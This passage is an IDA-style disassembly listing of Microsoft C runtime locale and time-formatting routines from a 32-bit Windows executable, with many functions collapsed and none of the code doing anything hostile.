; [00000246 BYTES: COLLAPSED FUNCTION _setlocale. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [0000011B BYTES: COLLAPSED FUNCTION __setlocale_set_cat. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [000000B9 BYTES: COLLAPSED FUNCTION __setlocale_get_all. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000118 BYTES: COLLAPSED FUNCTION __expandlocale. PRESS KEYPAD CTRL-"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_408054	proc near		; CODE XREF: __setlocale_set_cat:loc_407E39p
					; DATA XREF: .data:off_43C068o
		xor	eax, eax
		retn
sub_408054	endp

; [00000025 BYTES: COLLAPSED FUNCTION __strcats. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000000CC BYTES: COLLAPSED FUNCTION ___lc_strtolc. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000053 BYTES: COLLAPSED FUNCTION ___lc_lctostr. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000091 BYTES: COLLAPSED FUNCTION ___init_time. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000034E BYTES: COLLAPSED FUNCTION __get_lc_time. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000190 BYTES: COLLAPSED FUNCTION __free_lc_time. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000001D5 BYTES: COLLAPSED FUNCTION ___init_numeric. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000037 BYTES: COLLAPSED FUNCTION _fix_grouping. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000000CB BYTES: COLLAPSED FUNCTION ___init_monetary.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000122 BYTES: COLLAPSED FUNCTION __get_lc_lconv. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000037 BYTES: COLLAPSED FUNCTION _fix_grouping_0. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [0000004E BYTES: COLLAPSED FUNCTION __free_lc_lconv. PRESS KEYPAD CTRL-"+" TO	EXPAND]

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_408B88	proc near		; DATA XREF: .data:0043C080o

CPInfo		= _cpinfo ptr -24h
lpMem		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
lpSrcStr	= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		push	ebx
		xor	ebx, ebx
		cmp	dword_43D740, ebx
		mov	[ebp+lpSrcStr],	ebx
		mov	[ebp+var_8], ebx
		jz	loc_408D95
		cmp	dword_43D750, ebx
		push	esi
		push	edi
		jnz	short loc_408BD0
		movzx	eax, word_43D794
		push	offset dword_43D750 ; int
		push	1004h		; LCType
		push	eax		; Locale
		push	ebx		; int
		call	___getlocaleinfo
		add	esp, 10h
		test	eax, eax
		jnz	loc_408D7E

loc_408BD0:				; CODE XREF: sub_408B88+23j
		mov	esi, 202h
		push	esi		; size_t
		call	_malloc
		mov	edi, eax
		push	esi		; size_t
		mov	[ebp+lpMem], edi
		call	_malloc
		push	101h		; size_t
		mov	[ebp+var_C], eax
		call	_malloc
		push	esi		; size_t
		mov	[ebp+lpSrcStr],	eax
		call	_malloc
		add	esp, 10h
		cmp	edi, ebx
		mov	[ebp+var_8], eax
		jz	loc_408D7E
		cmp	[ebp+var_C], ebx
		jz	loc_408D7E
		cmp	[ebp+lpSrcStr],	ebx
		jz	loc_408D7E
		cmp	eax, ebx
		jz	loc_408D7E
		xor	eax, eax
		mov	esi, 100h

loc_408C2B:				; CODE XREF: sub_408B88+ACj
		mov	ecx, [ebp+lpSrcStr]
		mov	[eax+ecx], al
		inc	eax
		cmp	eax, esi
		jl	short loc_408C2B
		lea	eax, [ebp+CPInfo]
		push	eax		; lpCPInfo
		push	dword_43D750	; CodePage
		call	ds:GetCPInfo
		test	eax, eax
		jz	loc_408D7E
		cmp	[ebp+CPInfo.MaxCharSize], 2
		ja	loc_408D7E
		movzx	eax, word ptr [ebp+CPInfo.MaxCharSize]
		cmp	eax, 1
		mov	dword_43BF48, eax
		jle	short loc_408C92
		cmp	[ebp+CPInfo.LeadByte], bl
		jz	short loc_408C92
		lea	eax, [ebp+CPInfo.LeadByte+1]

loc_408C6E:				; CODE XREF: sub_408B88+108j
		mov	dl, [eax]
		cmp	dl, bl
		jz	short loc_408C92
		movzx	ecx, byte ptr [eax-1]
		movzx	edx, dl

loc_408C7B:				; CODE XREF: sub_408B88+101j
		cmp	ecx, edx
		jg	short loc_408C8B
		mov	edx, [ebp+lpSrcStr]
		mov	[ecx+edx], bl
		inc	ecx
		movzx	edx, byte ptr [eax]
		jmp	short loc_408C7B
; ---------------------------------------------------------------------------

loc_408C8B:				; CODE XREF: sub_408B88+F5j
		inc	eax
		inc	eax
		cmp	[eax-1], bl
		jnz	short loc_408C6E

loc_408C92:				; CODE XREF: sub_408B88+DCj
					; sub_408B88+E1j ...
		push	ebx		; int
		lea	eax, [edi+2]
		push	ebx		; Locale
		push	ebx		; CodePage
		push	eax		; lpCharType
		push	esi		; cchSrc
		push	[ebp+lpSrcStr]	; lpSrcStr
		push	1		; dwInfoType
		call	___crtGetStringTypeA
		add	esp, 1Ch
		test	eax, eax
		jz	loc_408D7E
		mov	ecx, [ebp+var_8]
		mov	[edi], bx
		xor	eax, eax

loc_408CB7:				; CODE XREF: sub_408B88+137j
		mov	[ecx], ax
		inc	ecx
		inc	ecx
		inc	eax
		cmp	eax, esi
		jl	short loc_408CB7
		mov	eax, [ebp+var_C]
		push	ebx		; Locale
		push	ebx		; CodePage
		lea	edi, [eax+2]
		push	edi		; lpCharType
		push	esi		; cchSrc
		push	[ebp+var_8]	; lpSrcStr
		push	1		; dwInfoType
		call	___crtGetStringTypeW
		add	esp, 18h
		test	eax, eax
		jz	loc_408D7E
		mov	eax, [ebp+var_C]
		mov	[eax], bx
		cmp	dword_43BF48, 1
		jle	short loc_408D25
		cmp	[ebp+CPInfo.LeadByte], bl
		jz	short loc_408D25
		lea	eax, [ebp+CPInfo.LeadByte+1]

loc_408CF7:				; CODE XREF: sub_408B88+19Bj
		mov	cl, [eax]
		cmp	cl, bl
		jz	short loc_408D25
		movzx	esi, byte ptr [eax-1]
		movzx	ecx, cl
		cmp	esi, ecx
		jg	short loc_408D1E
		mov	ecx, [ebp+lpMem]
		lea	ecx, [ecx+esi*2+2]

loc_408D0F:				; CODE XREF: sub_408B88+194j
		mov	word ptr [ecx],	8000h
		inc	esi
		movzx	edx, byte ptr [eax]
		inc	ecx
		inc	ecx
		cmp	esi, edx
		jle	short loc_408D0F

loc_408D1E:				; CODE XREF: sub_408B88+17Ej
		inc	eax
		inc	eax
		cmp	[eax-1], bl
		jnz	short loc_408CF7

loc_408D25:				; CODE XREF: sub_408B88+165j
					; sub_408B88+16Aj ...
		mov	eax, [ebp+lpMem]
		mov	off_43BBD4, edi
		add	eax, 2
		mov	off_43BBD0, eax
		mov	eax, dword_43D780
		cmp	eax, ebx
		jz	short loc_408D46
		push	eax		; lpMem
		call	sub_402821
		pop	ecx

loc_408D46:				; CODE XREF: sub_408B88+1B5j
		mov	eax, [ebp+lpMem]
		mov	dword_43D780, eax
		mov	eax, dword_43D784
		cmp	eax, ebx
		jz	short loc_408D5E
		push	eax		; lpMem
		call	sub_402821
		pop	ecx

loc_408D5E:				; CODE XREF: sub_408B88+1CDj
		mov	eax, [ebp+var_C]
		mov	dword_43D784, eax

loc_408D66:				; CODE XREF: sub_408B88+20Bj
		push	[ebp+lpSrcStr]	; lpMem
		call	sub_402821
		push	[ebp+var_8]	; lpMem
		call	sub_402821
		pop	ecx
		mov	eax, ebx
		pop	ecx
		pop	edi
		pop	esi
		jmp	short loc_408DCA
; ---------------------------------------------------------------------------

loc_408D7E:				; CODE XREF: sub_408B88+42j
					; sub_408B88+7Cj ...
		push	[ebp+lpMem]	; lpMem
		call	sub_402821
		push	[ebp+var_C]	; lpMem
		call	sub_402821
		pop	ecx
		pop	ecx
		push	1
		pop	ebx
		jmp	short loc_408D66
; ---------------------------------------------------------------------------

loc_408D95:				; CODE XREF: sub_408B88+15j
		push	dword_43D780	; lpMem
		mov	eax, (offset __ctype+2)
		mov	off_43BBD0, eax
		mov	off_43BBD4, eax
		call	sub_402821
		push	dword_43D784	; lpMem
		call	sub_402821
		pop	ecx
		mov	dword_43D780, ebx
		pop	ecx
		mov	dword_43D784, ebx
		xor	eax, eax

loc_408DCA:				; CODE XREF: sub_408B88+1F4j
		pop	ebx
		leave
		retn
sub_408B88	endp


; =============== S U B	R O U T	I N E =======================================


sub_408DCD	proc near		; DATA XREF: .data:0043C074o
		xor	eax, eax
		retn
sub_408DCD	endp

; [0000003E BYTES: COLLAPSED FUNCTION _strcspn.	PRESS KEYPAD CTRL-"+" TO EXPAND]
		align 10h
; [0000003A BYTES: COLLAPSED FUNCTION _strpbrk.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000017D BYTES: COLLAPSED FUNCTION ___get_qualified_locale. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000058 BYTES: COLLAPSED FUNCTION _TranslateName. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000087 BYTES: COLLAPSED FUNCTION _GetLcidFromLangCountry. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000204 BYTES: COLLAPSED FUNCTION LangCountryEnumProc(x). PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000056 BYTES: COLLAPSED FUNCTION _GetLcidFromLanguage. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000000BD BYTES: COLLAPSED FUNCTION LanguageEnumProc(x). PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000037 BYTES: COLLAPSED FUNCTION _GetLcidFromCountry. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000086 BYTES: COLLAPSED FUNCTION CountryEnumProc(x). PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [0000001A BYTES: COLLAPSED FUNCTION _GetLcidFromDefault. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000066 BYTES: COLLAPSED FUNCTION _ProcessCodePage.	PRESS KEYPAD CTRL-"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_4094FA	proc near		; CODE XREF: LangCountryEnumProc(x)+104p
					; CountryEnumProc(x)+57p

arg_0		= word ptr  4

		mov	eax, offset dword_43C554

loc_4094FF:				; CODE XREF: sub_4094FA+16j
		mov	cx, [esp+arg_0]
		cmp	cx, [eax]
		jz	short loc_409516
		inc	eax
		inc	eax
		cmp	eax, offset off_43C568
		jb	short loc_4094FF
		push	1
		pop	eax
		retn
; ---------------------------------------------------------------------------

loc_409516:				; CODE XREF: sub_4094FA+Dj
		xor	eax, eax
		retn
sub_4094FA	endp

; [00000062 BYTES: COLLAPSED FUNCTION _TestDefaultLanguage. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000036 BYTES: COLLAPSED FUNCTION _IsThisWindowsNT.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000000E6 BYTES: COLLAPSED FUNCTION crtGetLocaleInfoA(x,x,x,x). PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [00000039 BYTES: COLLAPSED FUNCTION _LcidFromHexString. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [00000021 BYTES: COLLAPSED FUNCTION _GetPrimaryLen. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000008F BYTES: COLLAPSED FUNCTION __Getdays. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000095 BYTES: COLLAPSED FUNCTION __Getmonths. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000232 BYTES: COLLAPSED FUNCTION __Gettnames. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------
		push	0
		push	dword ptr [esp+14h]
		push	dword ptr [esp+14h]
		push	dword ptr [esp+14h]
		push	dword ptr [esp+14h]
		call	sub_409A62
		add	esp, 14h
		retn

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_409A62	proc near		; CODE XREF: .text:00409A59p

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		mov	eax, [ebp+arg_4]
		push	ebx
		push	esi
		push	edi
		mov	edi, offset Addend
		mov	[ebp+var_4], eax
		push	edi		; lpAddend
		call	ds:InterlockedIncrement
		mov	ebx, ds:InterlockedDecrement
		xor	esi, esi
		cmp	dword_43D8BC, esi
		jz	short loc_409AA0
		push	edi		; lpAddend
		call	ebx ; InterlockedDecrement
		push	13h
		call	__lock
		pop	ecx
		mov	[ebp+var_8], 1
		jmp	short loc_409AA3
; ---------------------------------------------------------------------------

loc_409AA0:				; CODE XREF: sub_409A62+28j
		mov	[ebp+var_8], esi

loc_409AA3:				; CODE XREF: sub_409A62+3Cj
		mov	eax, [ebp+arg_10]
		cmp	eax, esi
		jnz	short loc_409AAF
		mov	eax, off_43C828

loc_409AAF:				; CODE XREF: sub_409A62+46j
		cmp	[ebp+var_4], esi
		mov	[ebp+arg_10], eax
		jbe	short loc_409B2E
		mov	esi, [ebp+arg_8]

loc_409ABA:				; CODE XREF: sub_409A62+CAj
		mov	al, [esi]
		test	al, al
		jz	short loc_409B2E
		cmp	al, 25h
		jz	short loc_409AF6
		mov	edx, off_43BBD0
		movzx	ecx, al
		test	byte ptr [edx+ecx*2+1],	80h
		jz	short loc_409AE6
		cmp	[ebp+var_4], 1
		jbe	short loc_409AE6
		mov	ecx, [ebp+arg_0]
		mov	[ecx], al
		inc	[ebp+arg_0]
		inc	esi
		dec	[ebp+var_4]

loc_409AE6:				; CODE XREF: sub_409A62+70j
					; sub_409A62+76j
		mov	ecx, [ebp+arg_0]
		mov	al, [esi]
		mov	[ecx], al
		inc	[ebp+arg_0]
		inc	esi
		dec	[ebp+var_4]
		jmp	short loc_409B28
; ---------------------------------------------------------------------------

loc_409AF6:				; CODE XREF: sub_409A62+60j
		and	dword_43D8A8, 0
		inc	esi
		cmp	byte ptr [esi],	23h
		jnz	short loc_409B0E
		mov	dword_43D8A8, 1
		inc	esi

loc_409B0E:				; CODE XREF: sub_409A62+9Fj
		push	[ebp+arg_10]
		lea	eax, [ebp+var_4]
		push	eax
		lea	eax, [ebp+arg_0]
		push	eax
		mov	al, [esi]
		push	[ebp+arg_C]
		push	eax
		call	__expandtime
		add	esp, 14h
		inc	esi

loc_409B28:				; CODE XREF: sub_409A62+92j
		cmp	[ebp+var_4], 0
		ja	short loc_409ABA

loc_409B2E:				; CODE XREF: sub_409A62+53j
					; sub_409A62+5Cj
		cmp	[ebp+var_8], 0
		jz	short loc_409B3E
		push	13h
		call	__unlock
		pop	ecx
		jmp	short loc_409B41
; ---------------------------------------------------------------------------

loc_409B3E:				; CODE XREF: sub_409A62+D0j
		push	edi		; lpAddend
		call	ebx ; InterlockedDecrement

loc_409B41:				; CODE XREF: sub_409A62+DAj
		cmp	[ebp+var_4], 0
		pop	edi
		pop	esi
		pop	ebx
		jbe	short loc_409B58
		mov	eax, [ebp+arg_0]
		and	byte ptr [eax],	0
		mov	eax, [ebp+arg_4]
		sub	eax, [ebp+var_4]
		leave
		retn
; ---------------------------------------------------------------------------

loc_409B58:				; CODE XREF: sub_409A62+E6j
		xor	eax, eax
		leave
		retn
sub_409A62	endp

; [000003EF BYTES: COLLAPSED FUNCTION __expandtime. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000027 BYTES: COLLAPSED FUNCTION __store_str. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [0000006F BYTES: COLLAPSED FUNCTION __store_num. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000049 BYTES: COLLAPSED FUNCTION __store_number. PRESS KEYPAD CTRL-"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_40A02A(char *, int, int, int,	int)
sub_40A02A	proc near		; CODE XREF: __expandtime:loc_409DE4p
					; __expandtime:loc_409EE2p

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		mov	ebx, [ebp+arg_0]
		push	esi
		push	edi
		cmp	byte ptr [ebx],	0
		jz	loc_40A0DA
		mov	edi, [ebp+arg_C]
		mov	esi, [ebp+arg_8]

loc_40A043:				; CODE XREF: sub_40A02A+AAj
		xor	ecx, ecx
		cmp	[edi], ecx
		jz	loc_40A0DA
		mov	dword_43D8B8, ecx
		mov	al, [ebx]
		mov	byte ptr [ebp+arg_0+3],	al
		lea	eax, [ebx+1]
		mov	[ebp+var_4], eax
		mov	[ebp+arg_8], eax

loc_40A061:				; CODE XREF: sub_40A02A+45j
		mov	eax, [ebp+arg_8]
		mov	dl, byte ptr [ebp+arg_0+3]
		inc	ecx
		inc	[ebp+arg_8]
		mov	al, [eax]
		cmp	al, dl
		jz	short loc_40A061
		dec	[ebp+arg_8]
		movsx	eax, dl
		cmp	eax, 64h
		jg	loc_40A1F4
		jz	loc_40A1BD
		cmp	eax, 27h
		jz	loc_40A165
		cmp	eax, 41h
		jz	loc_40A12F
		cmp	eax, 48h
		jz	short loc_40A112
		cmp	eax, 4Dh
		jz	short loc_40A0DF
		cmp	eax, 61h
		jz	loc_40A12F

loc_40A0AB:				; CODE XREF: sub_40A02A+C1j
					; sub_40A02A+F0j ...
		mov	ecx, off_43BBD0
		movzx	eax, dl
		test	byte ptr [ecx+eax*2+1],	80h
		jz	short loc_40A0C6
		mov	eax, [esi]
		mov	ebx, [ebp+var_4]
		mov	[eax], dl
		inc	dword ptr [esi]
		dec	dword ptr [edi]

loc_40A0C6:				; CODE XREF: sub_40A02A+8Fj
		mov	eax, [esi]
		mov	cl, [ebx]
		mov	[eax], cl
		inc	dword ptr [esi]
		inc	ebx
		dec	dword ptr [edi]

loc_40A0D1:				; CODE XREF: sub_40A02A+146j
					; sub_40A02A+14Fj ...
		cmp	byte ptr [ebx],	0
		jnz	loc_40A043

loc_40A0DA:				; CODE XREF: sub_40A02A+Dj
					; sub_40A02A+1Dj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
; ---------------------------------------------------------------------------

loc_40A0DF:				; CODE XREF: sub_40A02A+76j
		mov	eax, ecx
		dec	eax
		jz	short loc_40A0FF
		dec	eax
		jz	short loc_40A109
		dec	eax
		jz	short loc_40A0F6
		dec	eax
		jnz	short loc_40A0AB
		mov	byte ptr [ebp+arg_C], 42h
		jmp	loc_40A320
; ---------------------------------------------------------------------------

loc_40A0F6:				; CODE XREF: sub_40A02A+BEj
		mov	byte ptr [ebp+arg_C], 62h
		jmp	loc_40A320
; ---------------------------------------------------------------------------

loc_40A0FF:				; CODE XREF: sub_40A02A+B8j
		mov	dword_43D8B8, 1

loc_40A109:				; CODE XREF: sub_40A02A+BBj
		mov	byte ptr [ebp+arg_C], 6Dh
		jmp	loc_40A320
; ---------------------------------------------------------------------------

loc_40A112:				; CODE XREF: sub_40A02A+71j
		mov	eax, ecx
		dec	eax
		jz	short loc_40A11C
		dec	eax
		jz	short loc_40A126
		jmp	short loc_40A0AB
; ---------------------------------------------------------------------------

loc_40A11C:				; CODE XREF: sub_40A02A+EBj
		mov	dword_43D8B8, 1

loc_40A126:				; CODE XREF: sub_40A02A+EEj
		mov	byte ptr [ebp+arg_C], 48h
		jmp	loc_40A320
; ---------------------------------------------------------------------------

loc_40A12F:				; CODE XREF: sub_40A02A+68j
					; sub_40A02A+7Bj
		push	offset aAmPm	; "am/pm"
		push	ebx		; char *
		call	__strcmpi
		pop	ecx
		test	eax, eax
		pop	ecx
		jnz	short loc_40A145
		add	ebx, 5
		jmp	short loc_40A159
; ---------------------------------------------------------------------------

loc_40A145:				; CODE XREF: sub_40A02A+114j
		push	offset aAP	; "a/p"
		push	ebx		; char *
		call	__strcmpi
		pop	ecx
		test	eax, eax
		pop	ecx
		jnz	short loc_40A15C
		add	ebx, 3

loc_40A159:				; CODE XREF: sub_40A02A+119j
		mov	[ebp+arg_8], ebx

loc_40A15C:				; CODE XREF: sub_40A02A+12Aj
		mov	byte ptr [ebp+arg_C], 70h
		jmp	loc_40A320
; ---------------------------------------------------------------------------

loc_40A165:				; CODE XREF: sub_40A02A+5Fj
		test	cl, 1
		jz	short loc_40A1B6
		add	ebx, ecx

loc_40A16C:				; CODE XREF: sub_40A02A+184j
		mov	al, [ebx]
		test	al, al
		jz	loc_40A0D1
		cmp	dword ptr [edi], 0
		jz	loc_40A0D1
		cmp	al, 27h
		jz	short loc_40A1B0
		mov	edx, off_43BBD0
		movzx	ecx, al
		test	byte ptr [edx+ecx*2+1],	80h
		jz	short loc_40A1A3
		mov	ecx, [edi]
		cmp	ecx, 1
		jbe	short loc_40A1A3
		mov	ecx, [esi]
		mov	[ecx], al
		inc	dword ptr [esi]
		inc	ebx
		dec	dword ptr [edi]

loc_40A1A3:				; CODE XREF: sub_40A02A+167j
					; sub_40A02A+16Ej
		mov	eax, [esi]
		mov	cl, [ebx]
		mov	[eax], cl
		inc	dword ptr [esi]
		inc	ebx
		dec	dword ptr [edi]
		jmp	short loc_40A16C
; ---------------------------------------------------------------------------

loc_40A1B0:				; CODE XREF: sub_40A02A+157j
		inc	ebx
		jmp	loc_40A0D1
; ---------------------------------------------------------------------------

loc_40A1B6:				; CODE XREF: sub_40A02A+13Ej
		add	ebx, ecx
		jmp	loc_40A0D1
; ---------------------------------------------------------------------------

loc_40A1BD:				; CODE XREF: sub_40A02A+56j
		mov	eax, ecx
		dec	eax
		jz	short loc_40A1E1
		dec	eax
		jz	short loc_40A1EB
		dec	eax
		jz	short loc_40A1D8
		dec	eax
		jnz	loc_40A0AB
		mov	byte ptr [ebp+arg_C], 41h
		jmp	loc_40A320
; ---------------------------------------------------------------------------

loc_40A1D8:				; CODE XREF: sub_40A02A+19Cj
		mov	byte ptr [ebp+arg_C], 61h
		jmp	loc_40A320
; ---------------------------------------------------------------------------

loc_40A1E1:				; CODE XREF: sub_40A02A+196j
		mov	dword_43D8B8, 1

loc_40A1EB:				; CODE XREF: sub_40A02A+199j
		mov	byte ptr [ebp+arg_C], 64h
		jmp	loc_40A320
; ---------------------------------------------------------------------------

loc_40A1F4:				; CODE XREF: sub_40A02A+50j
		sub	eax, 68h
		jz	loc_40A305
		sub	eax, 5
		jz	loc_40A2E8
		sub	eax, 6
		jz	loc_40A2CB
		dec	eax
		jz	short loc_40A23B
		sub	eax, 5
		jnz	loc_40A0AB
		mov	eax, ecx
		dec	eax
		dec	eax
		jz	short loc_40A232
		dec	eax
		dec	eax
		jnz	loc_40A0AB
		mov	byte ptr [ebp+arg_C], 59h
		jmp	loc_40A320
; ---------------------------------------------------------------------------

loc_40A232:				; CODE XREF: sub_40A02A+1F5j
		mov	byte ptr [ebp+arg_C], 79h
		jmp	loc_40A320
; ---------------------------------------------------------------------------

loc_40A23B:				; CODE XREF: sub_40A02A+1E6j
		mov	eax, [ebp+arg_4]
		cmp	dword ptr [eax+8], 0Bh
		mov	eax, [ebp+arg_10]
		jg	short loc_40A24F
		mov	eax, [eax+98h]
		jmp	short loc_40A255
; ---------------------------------------------------------------------------

loc_40A24F:				; CODE XREF: sub_40A02A+21Bj
		mov	eax, [eax+9Ch]

loc_40A255:				; CODE XREF: sub_40A02A+223j
		cmp	ecx, 1
		jnz	short loc_40A293
		cmp	dword ptr [edi], 0
		jbe	short loc_40A293
		mov	cl, [eax]
		mov	ebx, off_43BBD0
		movzx	edx, cl
		test	byte ptr [ebx+edx*2+1],	80h
		jz	short loc_40A281
		mov	edx, [edi]
		cmp	edx, 1
		jbe	short loc_40A281
		mov	edx, [esi]
		mov	[edx], cl
		inc	dword ptr [esi]
		inc	eax
		dec	dword ptr [edi]

loc_40A281:				; CODE XREF: sub_40A02A+245j
					; sub_40A02A+24Cj
		mov	ecx, [esi]
		mov	al, [eax]
		mov	[ecx], al
		inc	dword ptr [esi]
		dec	dword ptr [edi]

loc_40A28B:				; CODE XREF: sub_40A02A+26Dj
					; sub_40A02A+272j ...
		mov	ebx, [ebp+arg_8]
		jmp	loc_40A0D1
; ---------------------------------------------------------------------------

loc_40A293:				; CODE XREF: sub_40A02A+22Ej
					; sub_40A02A+233j ...
		mov	cl, [eax]
		test	cl, cl
		jz	short loc_40A28B
		cmp	dword ptr [edi], 0
		jbe	short loc_40A28B
		mov	ebx, off_43BBD0
		movzx	edx, cl
		test	byte ptr [ebx+edx*2+1],	80h
		jz	short loc_40A2BE
		mov	edx, [edi]
		cmp	edx, 1
		jbe	short loc_40A2BE
		mov	edx, [esi]
		mov	[edx], cl
		inc	dword ptr [esi]
		inc	eax
		dec	dword ptr [edi]

loc_40A2BE:				; CODE XREF: sub_40A02A+282j
					; sub_40A02A+289j
		mov	ecx, [esi]
		mov	dl, [eax]
		mov	[ecx], dl
		inc	dword ptr [esi]
		inc	eax
		dec	dword ptr [edi]
		jmp	short loc_40A293
; ---------------------------------------------------------------------------

loc_40A2CB:				; CODE XREF: sub_40A02A+1DFj
		mov	eax, ecx
		dec	eax
		jz	short loc_40A2D8
		dec	eax
		jz	short loc_40A2E2
		jmp	loc_40A0AB
; ---------------------------------------------------------------------------

loc_40A2D8:				; CODE XREF: sub_40A02A+2A4j
		mov	dword_43D8B8, 1

loc_40A2E2:				; CODE XREF: sub_40A02A+2A7j
		mov	byte ptr [ebp+arg_C], 53h
		jmp	short loc_40A320
; ---------------------------------------------------------------------------

loc_40A2E8:				; CODE XREF: sub_40A02A+1D6j
		mov	eax, ecx
		dec	eax
		jz	short loc_40A2F5
		dec	eax
		jz	short loc_40A2FF
		jmp	loc_40A0AB
; ---------------------------------------------------------------------------

loc_40A2F5:				; CODE XREF: sub_40A02A+2C1j
		mov	dword_43D8B8, 1

loc_40A2FF:				; CODE XREF: sub_40A02A+2C4j
		mov	byte ptr [ebp+arg_C], 4Dh
		jmp	short loc_40A320
; ---------------------------------------------------------------------------

loc_40A305:				; CODE XREF: sub_40A02A+1CDj
		mov	eax, ecx
		dec	eax
		jz	short loc_40A312
		dec	eax
		jz	short loc_40A31C
		jmp	loc_40A0AB
; ---------------------------------------------------------------------------

loc_40A312:				; CODE XREF: sub_40A02A+2DEj
		mov	dword_43D8B8, 1

loc_40A31C:				; CODE XREF: sub_40A02A+2E1j
		mov	byte ptr [ebp+arg_C], 49h

loc_40A320:				; CODE XREF: sub_40A02A+C7j
					; sub_40A02A+D0j ...
		push	[ebp+arg_10]
		push	edi
		push	esi
		push	[ebp+arg_4]
		push	[ebp+arg_C]
		call	__expandtime
		add	esp, 14h
		jmp	loc_40A28B
sub_40A02A	endp

; [00000138 BYTES: COLLAPSED FUNCTION ___getlocaleinfo.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------
		mov	eax, off_43C918
		retn
; [000001C5 BYTES: COLLAPSED FUNCTION ___crtGetStringTypeW. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000002D BYTES: COLLAPSED FUNCTION __itoa. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000005C BYTES: COLLAPSED FUNCTION _xtoa. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000002A BYTES: COLLAPSED FUNCTION __ltoa. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000001B BYTES: COLLAPSED FUNCTION __ultoa. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000031 BYTES: COLLAPSED FUNCTION __i64toa.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000086 BYTES: COLLAPSED FUNCTION x64toa(x,x,x,x,x). PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000001B BYTES: COLLAPSED FUNCTION __ui64toa. PRESS KEYPAD CTRL-"+" TO EXPAND]
		align 10h
; [000000D0 BYTES: COLLAPSED FUNCTION __strcmpi. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000101 BYTES: COLLAPSED FUNCTION __strnicmp. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [0000008B BYTES: COLLAPSED FUNCTION _atol. PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------
		push	dword ptr [esp+4]
		call	_atol
		pop	ecx
		retn
; [000000BA BYTES: COLLAPSED FUNCTION __atoi64.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000002E BYTES: COLLAPSED FUNCTION ___tzset.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000016 BYTES: COLLAPSED FUNCTION __tzset. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000287 BYTES: COLLAPSED FUNCTION __tzset_lk. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; ---------------------------------------------------------------------------

__isindst:
		push	esi
		push	0Bh
		call	__lock
		push	dword ptr [esp+0Ch]
		call	__isindst_0
		push	0Bh
		mov	esi, eax
		call	__unlock
		add	esp, 0Ch
		mov	eax, esi
		pop	esi
		retn
; [000001AC BYTES: COLLAPSED FUNCTION __isindst_0. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000140 BYTES: COLLAPSED FUNCTION _cvtdate.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000113 BYTES: COLLAPSED FUNCTION ___crtGetLocaleInfoW. PRESS KEYPAD CTRL-"+" TO EXPAND]
